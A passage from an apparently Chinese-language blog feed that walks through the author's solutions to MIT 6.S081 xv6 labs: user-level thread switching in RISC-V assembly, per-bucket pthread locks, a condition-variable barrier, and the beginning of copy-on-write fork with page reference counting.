uint64 s0;<br>    uint64 s1;<br>    uint64 s2;<br>    uint64 s3;<br>    uint64 s4;<br>    uint64 s5;<br>    uint64 s6;<br>    uint64 s7;<br>    uint64 s8;<br>    uint64 s9;<br>    uint64 s10;<br>    uint64 s11;<br>&#125;;<br></code></pre></td></tr></table></figure><p>然后修改<code>uthread_switch</code>的定义为<code>extern void thread_switch(struct context *, struct context *);</code>，并将上下文保存和恢复的汇编加入对应的汇编文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c">.text<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">         * save the old thread&#x27;s registers,</span><br><span class="hljs-comment">         * restore the new thread&#x27;s registers.</span><br><span class="hljs-comment">         */</span><br><br>.globl thread_switch<br>thread_switch:<br><span class="hljs-comment">/* YOUR CODE HERE */</span><br>sd ra, <span class="hljs-number">0</span>(a0)<br>sd sp, <span class="hljs-number">8</span>(a0)<br>sd s0, <span class="hljs-number">16</span>(a0)<br>sd s1, <span class="hljs-number">24</span>(a0)<br>sd s2, <span class="hljs-number">32</span>(a0)<br>sd s3, <span class="hljs-number">40</span>(a0)<br>sd s4, <span class="hljs-number">48</span>(a0)<br>sd s5, <span class="hljs-number">56</span>(a0)<br>sd s6, <span class="hljs-number">64</span>(a0)<br>sd s7, <span class="hljs-number">72</span>(a0)<br>sd s8, <span class="hljs-number">80</span>(a0)<br>sd s9, <span class="hljs-number">88</span>(a0)<br>sd s10, <span class="hljs-number">96</span>(a0)<br>sd s11, <span class="hljs-number">104</span>(a0)<br><br>ld ra, <span class="hljs-number">0</span>(a1)<br>ld sp, <span class="hljs-number">8</span>(a1)<br>ld s0, <span class="hljs-number">16</span>(a1)<br>ld s1, <span class="hljs-number">24</span>(a1)<br>ld s2, <span class="hljs-number">32</span>(a1)<br>ld s3, <span class="hljs-number">40</span>(a1)<br>ld s4, <span class="hljs-number">48</span>(a1)<br>ld s5, <span class="hljs-number">56</span>(a1)<br>ld s6, <span class="hljs-number">64</span>(a1)<br>ld s7, <span class="hljs-number">72</span>(a1)<br>ld s8, <span class="hljs-number">80</span>(a1)<br>ld s9, <span class="hljs-number">88</span>(a1)<br>ld s10, <span class="hljs-number">96</span>(a1)<br>ld s11, <span class="hljs-number">104</span>(a1)<br><br>ret    <span class="hljs-comment">/* return to ra */</span><br></code></pre></td></tr></table></figure><h3 id="thread-create"><a href="#thread-create" class="headerlink" title="thread_create"></a>thread_create</h3><p>在这里，我们需要设置ra和sp寄存器，分别指向函数的入口地址和栈的初始地址。其中栈的地址应该定位在栈的最高地址，因为它向下增长</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// YOUR CODE HERE</span><br>t-&gt;ctx.ra = (uint64)func;<br>t-&gt;ctx.sp = (uint64)t-&gt;<span class="hljs-built_in">stack</span> + STACK_SIZE - <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><h3 id="thread-schedule"><a href="#thread-schedule" class="headerlink" title="thread_schedule"></a>thread_schedule</h3><p>最后在这个函数中加入一行即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-comment">/* YOUR CODE HERE</span><br><span class="hljs-comment">* Invoke thread_switch to switch from t to next_thread:</span><br><span class="hljs-comment">* thread_switch(??, ??);</span><br><span class="hljs-comment">*/</span><br>   thread_switch(&amp;t-&gt;ctx, &amp;current_thread-&gt;ctx);<br></code></pre></td></tr></table></figure><p>这个task自己要写的代码非常少，但是<code>uthread.c</code>整个文件可以说包含了上下文切换最关键的部分了，很值得学习。</p><p>并且原来在用户态，也可以在c代码里面嵌入汇编代码，神奇。</p><h1 id="Using-threads"><a href="#Using-threads" class="headerlink" title="Using threads"></a>Using threads</h1><p>首先，为了避免插入时出错，你需要在<code>put</code>和<code>get</code>中使用锁，如果能够在make grade中通过ph_safe，就说明成功</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">pthread_mutex_t</span> lock;            <span class="hljs-comment">// declare a lock</span><br>pthread_mutex_init(&amp;lock, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// initialize the lock</span><br>pthread_mutex_lock(&amp;lock);       <span class="hljs-comment">// acquire lock</span><br>pthread_mutex_unlock(&amp;lock);     <span class="hljs-comment">// release lock</span><br></code></pre></td></tr></table></figure><p>然后你应该优化你的代码，使得你能通过ph_fast的测试，你可以在每个桶上添加一个锁。两个线程至少要达到1.25倍的速度</p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>直接一步到位了，给每个bucker设置一个锁，并在main函数中对锁初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">pthread_mutex_t</span> locks[NBUCKET];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_lock</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NBUCKET; i++) &#123;<br>        pthread_mutex_init(&amp;locks[i], <span class="hljs-literal">NULL</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后构造两个宏，省的后面输入一大串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> LOCK(i) (pthread_mutex_lock(&amp;locks[i]));</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UNLOCK(i) (pthread_mutex_unlock(&amp;locks[i]));</span><br></code></pre></td></tr></table></figure><p>最后在put和get的起始和末尾都加上一个<code>LOCK(i)</code>和<code>UNLOC(i)</code></p><p><img src="https://img-blog.csdnimg.cn/img_convert/d3b030e817b0d7a4a2b6c28385d3b98e.png" alt="image-20230825163234832"></p><h1 id="Barrier"><a href="#Barrier" class="headerlink" title="Barrier"></a>Barrier</h1><p>这部分的实验文档看得我迷迷糊糊的，还是看了半天源代码才看懂是啥意思。</p><p>关键就是下面这个函数，我们每一次for循环，bstate.round都应该和循环轮数相同。再结合实验文档可以知道，就是要求我们通过barrier实现所有线程都在同一次for循环里，不能有人提前进入下一轮，因为这样的话，这个assert肯定就要错了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *xa)</span> &#123;<br>    <span class="hljs-type">long</span> n = (<span class="hljs-type">long</span>)xa;<br>    <span class="hljs-type">long</span> delay;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20000</span>; i++) &#123;<br>        <span class="hljs-type">int</span> t = bstate.round;<br>        assert(i == t);<br>        barrier();<br>        usleep(random() % <span class="hljs-number">100</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后就是这个结构体，它是关键。其中round代表的就是现在for循环的轮数，而nthread代表的是目前已经有多少个线程到达了屏障正在阻塞等待，然后上面就是两个锁，一个是常规的互斥锁，一个是条件变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">barrier</span> &#123;</span><br>    <span class="hljs-type">pthread_mutex_t</span> barrier_mutex;<br>    <span class="hljs-type">pthread_cond_t</span> barrier_cond;<br>    <span class="hljs-type">int</span> nthread; <span class="hljs-comment">// Number of threads that have reached this round of the barrier</span><br>    <span class="hljs-type">int</span> round;   <span class="hljs-comment">// Barrier round</span><br>&#125; bstate;<br></code></pre></td></tr></table></figure><p>条件变量的使用也很有意思。第一个wait操作，要求这个线程必须持有锁，然后调用wait之后，这个线程会释放这个锁，然后进入阻塞睡眠。第二个广播操作，会将通过cond阻塞的所有线程都唤醒。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">pthread_cond_wait(&amp;cond, &amp;mutex);  <span class="hljs-comment">// go to sleep on cond, releasing lock mutex, acquiring upon wake up</span><br>pthread_cond_broadcast(&amp;cond);     <span class="hljs-comment">// wake up every thread sleeping on cond</span><br></code></pre></td></tr></table></figure><p>上面两个锁的组合就可以构建barrier函数。有一些宏定义，方便使用。</p><p>首先，每个进入barrier的线程都应该将现在进入barrier的线程数量加1。而为了防止并发带来的问题，+1的过程肯定是要用锁的，我们这里正好就是用了barrier_mutex。</p><p>然后，我们需要判断目前的数量是否已经达到了线程总数nthread</p><ol><li>如果没达到，那就通过条件变量让它睡觉去吧</li><li>如果达到了，那么我们需要将所有因此阻塞的进程都唤醒<ol><li>但是在唤醒之前，我们需要先将bstate的round和nthread变量给更新了</li><li>如果我们是在唤醒之后更新，那么可能cpu瞬间就被别人抢去了，然后那些人就进入了下一轮for循环，直接assert失败。</li></ol></li></ol><p>还有一种很恶心的并发问题，就是如果我们很早就UNLOCK了，那么有可能某个线程还没有wait，就有一个线程调用了广播，那么后果就是这个线程永远不会被唤醒。不过在我们这里是不会出现这种情况的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> LOCK() (pthread_mutex_lock(&amp;bstate.barrier_mutex))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UNLOCK() (pthread_mutex_unlock(&amp;bstate.barrier_mutex))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> WAIT() (pthread_cond_wait(&amp;bstate.barrier_cond, &amp;bstate.barrier_mutex))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BROADCAST() (pthread_cond_broadcast(&amp;bstate.barrier_cond))</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">barrier</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// YOUR CODE HERE</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// Block until all threads have called barrier() and</span><br>    <span class="hljs-comment">// then increment bstate.round.</span><br>    <span class="hljs-comment">//</span><br>    LOCK();<br>    bstate.nthread += <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (bstate.nthread &lt; nthread) &#123;<br>        WAIT();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        bstate.round += <span class="hljs-number">1</span>;<br>        bstate.nthread = <span class="hljs-number">0</span>;<br>        BROADCAST();<br>    &#125;<br>    UNLOCK();<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Operating System</category>
      
      <category>MIT6.S081</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Operating System</tag>
      
      <tag>MIT6.S081</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>6.s081_lab6</title>
    <link href="/2023/08/24/6-s081-lab6/"/>
    <url>/2023/08/24/6-s081-lab6/</url>
    
    <content type="html"><![CDATA[<p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/20231224204451.png" alt="20231224204451"></p><h1 id="task"><a href="#task" class="headerlink" title="task"></a>task</h1><p>cow的目标就是延迟分配，并且直到必须要复制的时候才会分配物理内存</p><ol><li>cow的fork只为child创造了一个页表，其中的PTE指向了父进程的物理页面cow的fork将父进程和孩子进程的用户态的PTE都标记为不可写</li><li>当某个进程想要去写一个cow的页面时，cpu会执行一个页错误<ol><li>内核的页错误处理函数会检测到</li><li>然后为错误的进程分配一个物理页面</li><li>将原始的页面拷贝的新的页面，</li><li>修改错误进程的PTE指向新的页面，并在PTE中标记为可写</li><li>当页面处理函数返回的时候，用户进程能够正常地写了</li></ol></li><li>一个物理页面只有在所有的引用都消失时，才会被free掉</li></ol><p>如果能够通过<code>cowtest</code>和<code>usertest</code>，则通过这个lab</p><h1 id="推荐完成路线"><a href="#推荐完成路线" class="headerlink" title="推荐完成路线"></a>推荐完成路线</h1><ol><li><p>修改<code>uvmcopy</code></p><ol><li><p>使其不是分配一个物理页面，而是将父进程的物理页面映射到子进程的页表中</p></li><li><p>将父进程和子进程的PTE中的PTE_W都清空</p><p> 补充：加入cow标识：<code>#define PTE_C (1L&lt;&lt;8)</code></p></li></ol></li><li><p>修改<code>usertrap</code></p><ol><li><p>使其能够识别出页错误</p></li><li><p>当一个页错误发生在cow的page上时</p><ol><li>用kalloc分配一个新的页</li><li>将旧的页拷贝到新的页</li><li>将新的页的地址更新到PTE中，并且设置PTE_W标志</li></ol></li><li><p>保证每个物理页面都是在完全没有进程引用的时候再被free，不可以提前</p><p> 一个好的实现方法是未每个物理界面都维护一个引用count</p><ol><li>当kalloc时设置引用计数为1</li><li>当一个进程调用fork的时候，给引用计数+1</li><li>任何一个进程free掉某一页的时候都讲引用计数减1</li><li>kfree应该只将引用计数为0的页面放到free链表上</li></ol><p> 你可以将引用计数记录在一个固定大小的数组中</p><ol><li><p>你需要想出一个映射的策略，以及决定它的size</p><p> 你可以将一个物理地址除以4096来得出索引的下标</p><p> 并且通过kinit能够给出的最大的物理地址得到最大的数组大小（size）：128<em>1024</em>1024&#x2F;4096</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// the kernel expects there to be RAM</span><br><span class="hljs-comment">// for use by the kernel and user pages</span><br><span class="hljs-comment">// from physical address 0x80000000 to PHYSTOP.</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KERNBASE 0x80000000L</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PHYSTOP (KERNBASE + 128*1024*1024)</span><br></code></pre></td></tr></table></figure></li></ol></li><li><p>修改<code>copyout</code>，让它在遇到cow的page时，使用和页错误相同的策略</p></li></ol></li></ol><h1 id="hints"><a href="#hints" class="headerlink" title="hints"></a>hints</h1><ol><li><p>用PTE中的RSWbits来标记这个页面是否是cow</p><p> <img src="https://img-blog.csdnimg.cn/img_convert/689f2e7fcca3f8d9606a7a85b7f41050.png" alt="image-20230824164155465"></p></li><li><p>一个对页表的标志有帮助的宏和定义在<code>kernel/riscv.h</code></p></li><li><p>如果一个cow的页错误发生了，并且没有多余的内存，这个进程应该被杀死</p></li></ol><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>按照实验文档推荐的路线来即可，但是还是有一些小坑的</p><h2 id="页引用计数"><a href="#页引用计数" class="headerlink" title="页引用计数"></a>页引用计数</h2><p>这一部分实验文档没有给出非常具体的指导<del>没有直接把饭喂到我这种菜鸡嘴里</del>，所以有许多具体实现的方式</p><p>我是将这一部分的代码全部放在了<code>kalloc.c</code>文件中。可以想一下，我们什么时候会用到这个页引用计数呢？</p><ol><li>当我们free一个页面的时候，会使用</li><li>当我们kalloc一个页面的时候，我们需要给它初始化为1</li><li>当我们遇到某个cow的页面被写的时候，需要重新分配并更改引用计数</li><li>当我们fork的时候，需要增加这个引用计数</li></ol><p>前2点已经足够让我们把相关的定义放到<code>kalloc.c</code>文件里，这里用到了一些宏，主要是为了后面使用其他方便</p><p>这里我们的count数组的大小，是由PHYSTOP和KERNBASE计算出来的，一个是可以分配的物理内存的最大值，一个是最小值。因此将它们相减，再除以页面的大小，就可以得到页数，也就是数组的大小。</p><p>通过PA2INDEX可以快速得出当前地址位于数组的哪个下标</p><p>下面的四个宏分别是求出这个地址对应的页面的引用计数值，以及初始化，减1和加1的操作</p><p>在对这个数组操作时，要用lock将其夹住</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// KERNBASE 不是 end</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PA2INDEX(pa) ((((uint64)pa) - KERNBASE) / PGSIZE)</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">lock</span>;</span><br>    <span class="hljs-type">int</span> count[PA2INDEX(PHYSTOP)];<br>&#125; ref_count;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PA2REFCOUNT(pa) (ref_count.count[PA2INDEX(pa)])</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAINITRC(pa) (ref_count.count[PA2INDEX(pa)] = 1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PADEC(pa) (ref_count.count[PA2INDEX(pa)]--)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAINC(pa) (ref_count.count[PA2INDEX(pa)]++)</span><br></code></pre></td></tr></table></figure><p>接下来分别在<code>kinit</code>，<code>kfree</code>和<code>kalloc</code>时将引用计数的逻辑加入</p><p>kinit比较简单，初始化这个锁就行了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">kinit</span><span class="hljs-params">()</span> &#123;<br>    initlock(&amp;kmem.lock, <span class="hljs-string">&quot;kmem&quot;</span>);<br>    <span class="hljs-comment">// 初始化计数数组的锁</span><br>    initlock(&amp;ref_count.lock, <span class="hljs-string">&quot;ref_count&quot;</span>);<br>    freerange(end, (<span class="hljs-type">void</span> *)PHYSTOP);<br>&#125;<br></code></pre></td></tr></table></figure><p>kfree只在这个页面引用计数为0时才真的free它。按理说，应该是用&#x3D;&#x3D;0去判断，可是这样的话xv6都启动不起来。找出问题了，因为最开始freerange的时候，引用计数没有值，你走来就给它减1，就是负数了，结果导致所有的页面都没有放到freelist中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">kfree</span><span class="hljs-params">(<span class="hljs-type">void</span> *pa)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">run</span> *<span class="hljs-title">r</span>;</span><br><br>    <span class="hljs-keyword">if</span> (((uint64)pa % PGSIZE) != <span class="hljs-number">0</span> || (<span class="hljs-type">char</span> *)pa &lt; end || (uint64)pa &gt;= PHYSTOP)<br>        panic(<span class="hljs-string">&quot;kfree&quot;</span>);<br><br>    acquire(&amp;ref_count.lock);<br>    PADEC(pa);<br>    <span class="hljs-keyword">if</span> (PA2REFCOUNT(pa) &lt;= <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// Fill with junk to catch dangling refs.</span><br>        <span class="hljs-built_in">memset</span>(pa, <span class="hljs-number">1</span>, PGSIZE);<br><br>        r = (<span class="hljs-keyword">struct</span> run *)pa;<br><br>        acquire(&amp;kmem.lock);<br>        r-&gt;next = kmem.freelist;<br>        kmem.freelist = r;<br>        release(&amp;kmem.lock);<br>    &#125;<br>    <span class="hljs-comment">// 必须放在最后，防止被释放两次</span><br>    release(&amp;ref_count.lock);<br>&#125;<br></code></pre></td></tr></table></figure><p>kalloc只需要一行，将对应的值初始化为1即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<br><span class="hljs-title function_">kalloc</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">run</span> *<span class="hljs-title">r</span>;</span><br><br>    acquire(&amp;kmem.lock);<br>    r = kmem.freelist;<br>    <span class="hljs-keyword">if</span> (r)<br>        kmem.freelist = r-&gt;next;<br>    release(&amp;kmem.lock);<br><br>    <span class="hljs-keyword">if</span> (r) &#123;<br>        <span class="hljs-built_in">memset</span>((<span class="hljs-type">char</span> *)r, <span class="hljs-number">5</span>, PGSIZE); <span class="hljs-comment">// fill with junk</span><br>        <span class="hljs-comment">// 初始化这个物理地址的引用数</span><br>        PAINITRC((<span class="hljs-type">char</span> *)r);<br>    &#125;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *)r;<br>&#125;<br></code></pre></td></tr></table></figure><p>同时，我们还需要两个函数，一个是在cow被写时用来分配一个物理页面并将原来的页面拷贝过去，一个是在fork的时候增加引用计数，分别叫做<code>kcopy</code>和<code>kinc</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 发生了对cow页面的写操作，必须要分配一个物理页面了</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">kcopy</span><span class="hljs-params">(<span class="hljs-type">void</span> *pa)</span> &#123;<br>    acquire(&amp;ref_count.lock);<br>    <span class="hljs-comment">// 如果自己就是唯一的拥有者了，那么就不用申请页面，直接用就完事了</span><br>    <span class="hljs-keyword">if</span> (PA2REFCOUNT(pa) == <span class="hljs-number">1</span>) &#123;<br>        release(&amp;ref_count.lock);<br>        <span class="hljs-keyword">return</span> pa;<br>    &#125;<br>    <span class="hljs-type">void</span> *npa = kalloc();<br>    <span class="hljs-comment">// 没有可用页面，返回0</span><br>    <span class="hljs-keyword">if</span> (npa == <span class="hljs-number">0</span>) &#123;<br>        release(&amp;ref_count.lock);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-comment">// 将当前页面的计数减1，并复制新的页面</span><br>    PADEC(pa);<br>    memmove(npa, pa, PGSIZE);<br>    release(&amp;ref_count.lock);<br>    <span class="hljs-keyword">return</span> npa;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 给某个页面增加一个计数</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">kinc</span><span class="hljs-params">(<span class="hljs-type">void</span> *pa)</span> &#123;<br>    acquire(&amp;ref_count.lock);<br>    PAINC(pa);<br>    release(&amp;ref_count.lock);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="uvmcopy"><a href="#uvmcopy" class="headerlink" title="uvmcopy"></a>uvmcopy</h2><p>fork时，不真正分配，只增加引用计数，并修改标志位</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">uvmcopy</span><span class="hljs-params">(<span class="hljs-type">pagetable_t</span> old, <span class="hljs-type">pagetable_t</span> new, uint64 sz)</span> &#123;<br>    <span class="hljs-type">pte_t</span> *pte;<br>    uint64 pa, i;<br>    uint flags;<br>    <span class="hljs-comment">// char *mem;</span><br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; sz; i += PGSIZE) &#123;<br>        <span class="hljs-keyword">if</span> ((pte = walk(old, i, <span class="hljs-number">0</span>)) == <span class="hljs-number">0</span>)<br>            panic(<span class="hljs-string">&quot;uvmcopy: pte should exist&quot;</span>);<br>        <span class="hljs-keyword">if</span> ((*pte &amp; PTE_V) == <span class="hljs-number">0</span>)<br>            panic(<span class="hljs-string">&quot;uvmcopy: page not present&quot;</span>);<br>        pa = PTE2PA(*pte);<br>        flags = PTE_FLAGS(*pte);<br>        <span class="hljs-comment">// 如果这个页面可写，才需要设置成cow，因为后面会直接给其write的权利，所以如果只读，那就不用cow了</span><br>        <span class="hljs-keyword">if</span> (*pte &amp; PTE_W) &#123;<br>            *pte |= PTE_C;<br>            *pte &amp;= ~PTE_W;<br>        &#125;<br>        <span class="hljs-comment">// 更新flags，下面mappages要用</span><br>        flags = PTE_FLAGS(*pte);<br>        <span class="hljs-comment">// 将父进程的物理地址映射到子进程的页表上</span><br>        <span class="hljs-keyword">if</span> (mappages(new, i, PGSIZE, (uint64)pa, flags) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> err;<br>        &#125;<br>        <span class="hljs-comment">// 增加引用计数</span><br>        kinc((<span class="hljs-type">void</span> *)pa);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>err:<br>    uvmunmap(new, <span class="hljs-number">0</span>, i / PGSIZE, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="usertrap"><a href="#usertrap" class="headerlink" 